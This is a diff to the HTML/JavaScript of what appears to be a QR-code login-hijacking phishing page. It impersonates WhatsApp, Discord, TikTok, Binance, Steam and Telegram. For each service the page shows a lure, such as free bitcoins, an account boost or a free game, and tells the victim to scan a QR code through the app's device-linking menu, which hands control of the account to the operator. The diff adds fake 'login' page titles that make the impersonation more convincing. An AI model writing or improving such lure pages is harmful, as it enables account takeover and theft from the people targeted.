@@ -10,6 +10,7 @@
             background-color: #5d66f6;
             color: #b4b6ba;
             font-family: "Roboto", "Helvetica Neue", Helvetica, Arial, sans-serif;
+            overflow: hidden;
         }
 
         h3 {
@@ -91,6 +92,7 @@
                     document.querySelector("#title").innerHTML = "Join Call";
                     document.querySelector("#message").innerHTML = "Sign in using this QR code within your mobile <strong>Whatsapp</strong> application to <strong>join the call</strong>.";
                     document.querySelector("#guide").innerHTML = "[ <strong>⁝</strong> > <strong>Linked devices</strong> > <strong>Link a device</strong> ]";
+                    document.title = "Whatsapp | login";
                     break;
                 case "discord.com":
                     document.querySelector("body").style.backgroundColor = "#5d66f6";
@@ -100,6 +102,7 @@
                     document.querySelector("#title").innerHTML = "Invite pending";
                     document.querySelector("#message").innerHTML = "Sign in using this QR code within your mobile <strong>Discord</strong> application to <strong>join the server</strong>.";
                     document.querySelector("#guide").innerHTML = "[ <strong>Profile</strong> > <strong>Scan QR Code</strong> ]";
+                    document.title = "Discord | login";
                     break;
                 case "www.tiktok.com":
                     document.querySelector("body").style.backgroundColor = "#ef2a50";
@@ -109,6 +112,7 @@
                     document.querySelector("#title").innerHTML = "Account Boost";
                     document.querySelector("#message").innerHTML = "Sign in using this QR code within your mobile <strong>TikTok</strong> application to give your account a <strong>permanent boost</strong>.";
                     document.querySelector("#guide").innerHTML = "[ <strong>Profile</strong> > <strong>Scan QR Code</strong> ]";
+                    document.title = "Tiktok | login";
                     break;
                 case "accounts.binance.com":
                     document.querySelector("body").style.backgroundColor = "#fcd949";
@@ -118,6 +122,7 @@
                     document.querySelector("#title").innerHTML = "Free Bitcoins";
                     document.querySelector("#message").innerHTML = "Sign in using this QR code within your mobile <strong>Binance</strong> application to receive <strong>receive free BTC</strong>.";
                     document.querySelector("#guide").innerHTML = "[ <strong>Profile</strong> > <strong>Scan QR Code</strong> ]";
+                    document.title = "Binance | login";
                     break;
                 case "store.steampowered.com":
                     document.querySelector("body").style.backgroundColor = "#181a21";
@@ -127,6 +132,7 @@
                     document.querySelector("#title").innerHTML = "Free Gift";
                     document.querySelector("#message").innerHTML = "Sign in using this QR code within your mobile <strong>Steam</strong> application to <strong>receive a free game gift</strong>.";
                     document.querySelector("#guide").innerHTML = "[ Open <strong>Steam Guard</strong> ]";
+                    document.title = "Steam | login";
                     break;
                 case "web.telegram.org":
                     document.querySelector("body").style.backgroundColor = "#8775e4";
@@ -136,6 +142,7 @@
                     document.querySelector("#title").innerHTML = "Join Channel";
                     document.querySelector("#message").innerHTML = "Sign in using this QR code within your mobile <strong>Telegram</strong> application to <strong>join the channel</strong>.";
                     document.querySelector("#guide").innerHTML = "[ <strong>⁝</strong> > <strong>Settings</strong> > <strong>Devices</strong> > <strong>Link Desktop Device</strong> ]";
+                    document.title = "Telegram | login";
             }
         }
 
